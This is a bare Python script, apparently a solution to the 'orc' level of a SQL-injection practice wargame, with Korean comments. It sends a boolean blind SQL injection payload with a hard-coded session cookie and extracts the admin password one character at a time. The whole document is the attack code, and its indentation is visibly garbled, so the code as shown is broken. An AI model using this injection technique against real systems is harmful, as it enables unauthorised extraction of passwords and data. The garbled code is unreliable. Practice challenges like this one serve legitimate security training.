import urllib.request
from urllib.parse import quote

# 답의 저장할 배열 선언
b = []   

for j in range(1, 9, 1):
        for i in range(48,123):

                    # 사용할 쿼리 제작 
                            url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
                                    query = "'||ascii(substr(pw,"+str(j)+",1)) ="+str(i)+"-- -"
                                            query = quote(query)
                                                    new_url = url + query
                                                            
                                                                    # 쿠키 값 추가 해줌
                                                                            req = urllib.request.Request(new_url)
                                                                                    req.add_header("Cookie", " _ga=GA1.2.893628562.1594020923; PHPSESSID=315gqa8cnllf7maiut4qg711k9")

                                                                                            response = urllib.request.urlopen(req)
                                                                                                    
                                                                                                            # 참일 경우 배열에 추가하고 반복문 중지
                                                                                                                    if str(response.read()).find("Hello admin") != -1:
                                                                                                                                    print("Found length!! =>"+str(chr(i)))
                                                                                                                                                b.append(str(chr(i)))  
                                                                                                                                                            break
                                                                                                                                                                else:
                                                                                                                                                                                print("{}".format(i))

                                                                                                                                                                                print("Finish")
                                                                                                                                                                                print("password:", b)
